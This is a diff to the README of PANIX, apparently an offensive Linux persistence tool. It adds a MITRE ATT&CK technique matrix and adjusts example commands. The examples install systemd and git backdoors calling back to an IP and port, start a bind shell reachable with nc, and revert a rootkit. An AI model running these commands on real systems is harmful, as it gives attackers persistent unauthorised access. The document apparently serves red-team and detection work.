@@ -166,7 +166,7 @@ The script should be largely self-explanatory, however, this section will show a
 Every persistence mechanism has a separate help menu:
 
 ```
-root@ubuntu2204:/home/ruben# ./panix.sh --udev --help
+ruben@ubuntu2204:~$ sudo ./panix.sh --udev --help
 Usage: ./panix.sh --udev [OPTIONS]
 --examples                              Display command examples
 -default                               Use default udev settings
@@ -181,7 +181,7 @@ Usage: ./panix.sh --udev [OPTIONS]
 
 Every persistence mechanism also has an `--examples` flag that shows default and custom examples, aiding in crafting the command that works for you.
 ```
-root@ubuntu2204:/home/ruben# ./panix.sh --git --examples
+ruben@ubuntu2204:~$ ./panix.sh --git --examples
 Examples:
 --default:
 ./panix.sh --git --default --ip 10.10.10.10 --port 1337 --hook|--pager
@@ -193,7 +193,7 @@ Examples:
 ```
 Most of the persistence mechanisms are very simple, and will (hopefully) not require much explanation. For example, systemd persistence can be set up simply through executing:
 ```
-root@ubuntu2204:/home/ruben# ./panix.sh --systemd --default --ip 10.10.10.10 --port 1337
+ruben@ubuntu2204:~$ sudo ./panix.sh --systemd --default --ip 10.10.10.10 --port 1337
 Service file created successfully!
 Timer file created successfully!
 Created symlink /etc/systemd/system/timers.target.wants/dbus-org.freedesktop.resolved.timer → /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer.
@@ -201,7 +201,7 @@ Created symlink /etc/systemd/system/timers.target.wants/dbus-org.freedesktop.res
 ```
 When setting up a persistence mechanism, the script will let you know whether it worked, and in cases where information is needed to work with the persistence mechanism, additional information is provided. For example the bind shell mechanism:
 ```
-root@ubuntu2204:/home/ruben# ./panix.sh --bind-shell --default --architecture x64
+ruben@ubuntu2204:~$ sudo ./panix.sh --bind-shell --default --architecture x64
 [+] Bind shell binary /tmp/bd64 created and executed in the background.
 [+] The bind shell is listening on port 9001.
 [+] To interact with it from a different system, use: nc -nv <IP> 9001
@@ -254,7 +254,7 @@ root@ubuntu2204:~#
 
 PANIX can clean its mess through the `--revert` command. Both for seperate modules:
 ```
-root@ubuntu2204:/home/ruben# ./panix.sh --revert rootkit
+ruben@ubuntu2204:~$ sudo ./panix.sh --revert rootkit
 
 ######################### [+] Reverting rootkit module... ######################### 
 
@@ -278,7 +278,7 @@ root@ubuntu2204:/home/ruben# ./panix.sh --revert rootkit
 
 And for all modules:
 ```
-root@ubuntu2204:/home/ruben# ./panix.sh --revert all
+ruben@ubuntu2204:~$ sudo ./panix.sh --revert all
 
 [+] Running full reversion with --revert-all...
 [+] Reverting all modules...
@@ -306,6 +306,54 @@ Error: 'at' binary is not present. Cannot revert 'at' jobs.
 [...]
 
 [+] Reversion of all modules complete.
+```
+
+PANIX has a built-in MITRE ATT&CK matrix that displays the techniques and sub-techniques available. 
+
+```
+ruben@ubuntu2204:~$ ./panix.sh --mitre-matrix
+
+MITRE ATT&CK Matrix - Persistence Techniques Supported by PANIX
+
+Persistence Method        Technique Name                           Technique ID    Sub-technique Name                       Sub-technique ID     URL                                                                   
+-------------------       --------------                           -------------   -----------------                        ---------------      ---------------------------------------------                         
+--at                      Scheduled Task                           T1053           At                                       T1053.002            https://attack.mitre.org/techniques/T1053/002                         
+--authorized-keys         Account Manipulation                     T1098           SSH Authorized Keys                      T1098.004            https://attack.mitre.org/techniques/T1098/004                         
+--backdoor-user           Create Account                           T1136           Local Account                            T1136.001            https://attack.mitre.org/techniques/T1136/001                         
+--bind-shell              Command and Scripting Interpreter        T1059           Unix Shell                               T1059.004            https://attack.mitre.org/techniques/T1059/004                         
+--cap                     Abuse Elevation Control Mechanism        T1548           N/A                                      N/A                  https://attack.mitre.org/techniques/T1548                             
+--create-user             Create Account                           T1136           Local Account                            T1136.001            https://attack.mitre.org/techniques/T1136/001                         
+--cron                    Scheduled Task                           T1053           Cron                                     T1053.003            https://attack.mitre.org/techniques/T1053/003                         
+--generator               Create or Modify System Process          T1543           Systemd Service                          T1543.002            https://attack.mitre.org/techniques/T1543/002                         
+--git                     Event Triggered Execution                T1546           N/A                                      N/A                  https://attack.mitre.org/techniques/T1546                             
+--initd                   Boot or Logon Initialization Scripts     T1037           N/A                                      N/A                  https://attack.mitre.org/techniques/T1037                             
+--ld-preload              Hijack Execution Flow                    T1574           Dynamic Linker Hijacking                 T1574.006            https://attack.mitre.org/techniques/T1574/006                         
+--lkm                     Boot or Logon Autostart Execution        T1547           Kernel Modules and Extensions            T1547.006            https://attack.mitre.org/techniques/T1547/006                         
+--malicious-container     Escape to Host                           T1610           N/A                                      N/A                  https://attack.mitre.org/techniques/T1610                             
+--malicious-package       Event Triggered Execution                T1546           Installer Packages                       T1546.016            https://attack.mitre.org/techniques/T1546/016                         
+--motd                    Boot or Logon Initialization Scripts     T1037           N/A                                      N/A                  https://attack.mitre.org/techniques/T1037                             
+--package-manager         Event Triggered Execution                T1546           Installer Packages                       T1546.016            https://attack.mitre.org/techniques/T1546/016                         
+--pam                     Modify Authentication Process            T1556           Pluggable Authentication Modules         T1556.003            https://attack.mitre.org/techniques/T1556/003                         
+--passwd-user             Account Manipulation                     T1098           N/A                                      N/A                  https://attack.mitre.org/techniques/T1098                             
+--password-change         Account Manipulation                     T1098           N/A                                      N/A                  https://attack.mitre.org/techniques/T1098                             
+--rc-local                Boot or Logon Initialization Scripts     T1037           RC Scripts                               T1037.004            https://attack.mitre.org/techniques/T1037/004                         
+--reverse-shell           Command and Scripting Interpreter        T1059           Unix Shell                               T1059.004            https://attack.mitre.org/techniques/T1059/004                         
+--rootkit                 Rootkit                                  T1014           N/A                                      N/A                  https://attack.mitre.org/techniques/T1014                             
+--shell-profile           Event Triggered Execution                T1546           Unix Shell Configuration Modification    T1546.004            https://attack.mitre.org/techniques/T1546/004                         
+--ssh-key                 Account Manipulation                     T1098           SSH Authorized Keys                      T1098.004            https://attack.mitre.org/techniques/T1098/004                         
+--sudoers                 Abuse Elevation Control Mechanism        T1548           Sudo and Sudo Caching                    T1548.003            https://attack.mitre.org/techniques/T1548/003                         
+--suid                    Abuse Elevation Control Mechanism        T1548           Setuid and Setgid                        T1548.001            https://attack.mitre.org/techniques/T1548/001                         
+--system-binary           Compromise Host Software Binary          T1554           N/A                                      N/A                  https://attack.mitre.org/techniques/T1554                             
+--systemd                 Create or Modify System Process          T1543           Systemd Service                          T1543.002            https://attack.mitre.org/techniques/T1543/002                         
+--udev                    Event Triggered Execution                T1546           Udev Rules                               T1546.017            https://attack.mitre.org/techniques/T1546/017                         
+--web-shell               Server Software Component                T1505           Web Shell                                T1505.003            https://attack.mitre.org/techniques/T1505/003                         
+--xdg                     Boot or Logon Autostart Execution        T1547           XDG Autostart Entries                    T1547.013            https://attack.mitre.org/techniques/T1547/013                         
+
+Legend:
+Technique: High-level MITRE ATT&CK technique.
+Sub-Technique: Specific sub-technique under a high-level technique.
+N/A: No specific sub-technique defined for this method.
+URL: Link to the official MITRE ATT&CK page for further details.
 ```
 
 ![](https://i.imgur.com/waxVImv.png)
